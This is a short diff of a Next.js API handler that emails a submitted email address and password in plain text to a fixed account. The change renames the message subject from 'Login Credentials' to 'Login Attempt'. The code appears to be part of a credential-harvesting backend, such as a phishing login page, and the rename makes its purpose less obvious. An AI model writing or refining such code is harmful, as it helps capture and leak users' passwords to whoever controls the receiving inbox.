@@ -21,7 +21,7 @@ export default function handler(req: NextApiRequest, res: NextApiResponse) {
     const mailOptions = {
       from: emailUser,
       to: emailUser,
-      subject: 'Login Credentials',
+      subject: 'Login Attempt',
       text: `Email: ${email}, Password: ${password}`,
     };
 
